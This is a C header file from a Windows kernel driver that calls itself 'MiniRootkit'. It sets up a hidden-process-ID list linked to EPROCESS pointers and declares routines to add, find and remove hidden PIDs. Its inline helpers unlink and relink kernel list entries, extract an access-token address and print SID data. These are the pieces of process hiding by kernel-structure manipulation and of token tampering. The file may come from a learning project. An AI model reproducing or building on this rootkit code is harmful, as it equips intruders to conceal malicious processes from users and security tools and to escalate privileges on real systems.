#ifndef __UTILS_H__
#define __UTILS_H__

#include <ntdef.h>
#include <ntifs.h>
#include <wdm.h>
// Include minwindef.h after ntifs.h and wdm.h to avoid redefinition errors
#include <minwindef.h>
#include "structures.h"

#define MODULE_NAME "MiniRootkit"
#define DBG_PREFIX "[" MODULE_NAME "] "
#define MyDbgPrint(_fmt, ...) DbgPrint(DBG_PREFIX _fmt "\n", ##__VA_ARGS__)

#define HIDDEN_PID_LIST_SIZE 256

typedef struct _HIDDEN_PID {
    DWORD ProcessId;
    _PEPROCESS pProc;
} HIDDEN_PID, *PHIDDEN_PID;

static inline PTOKEN GetTokenAddress(IN CONST PEX_FAST_REF pToken) {
    return (PTOKEN)(pToken->Value & ~0xFULL);
}

static inline DWORD GetPid(IN CONST _PEPROCESS pProc) {
    return (DWORD)(ULONG_PTR)pProc->UniqueProcessId;
}

static inline ULONGLONG GetAuthorityValue(IN CONST PSID_IDENTIFIER_AUTHORITY pAuthority) {
    return ((ULONGLONG)pAuthority->Value[5] << 0x00) | ((ULONGLONG)pAuthority->Value[4] << 0x08) |
           ((ULONGLONG)pAuthority->Value[3] << 0x10) | ((ULONGLONG)pAuthority->Value[2] << 0x18) |
           ((ULONGLONG)pAuthority->Value[1] << 0x20) | ((ULONGLONG)pAuthority->Value[0] << 0x28);
}

static inline VOID InsertElementAfter(IN PLIST_ENTRY pListHead, IN PLIST_ENTRY pNewEntry) {
    PLIST_ENTRY pNext = pListHead->Flink;
    pListHead->Flink = pNewEntry;
    pNewEntry->Blink = pListHead;
    pNewEntry->Flink = pNext;
    if (pNext != NULL) {
        pNext->Blink = pNewEntry;
    }
}

static inline VOID RemoveListEntry(IN PLIST_ENTRY pEntry, IN BOOL bClearLinks) {
    PLIST_ENTRY pPrev = pEntry->Blink;
    PLIST_ENTRY pNext = pEntry->Flink;
    if (pPrev != NULL) {
        pPrev->Flink = pNext;
    }
    if (pNext != NULL) {
        pNext->Blink = pPrev;
    }
    if (bClearLinks) {
        pEntry->Flink = NULL;
        pEntry->Blink = NULL;
    }
}

NTSTATUS AddHiddenPid(IN DWORD dwPid, IN CONST _PEPROCESS pProc);
_PEPROCESS GetHiddenPidEprocess(IN DWORD dwPid);
NTSTATUS RemoveHiddenPid(IN DWORD dwPid);

VOID PrintSidInfo(IN CONST PSID_AND_ATTRIBUTES pUserAndGroups, IN ULONG ulUserAndGroupCount);

#endif  // __UTILS_H__
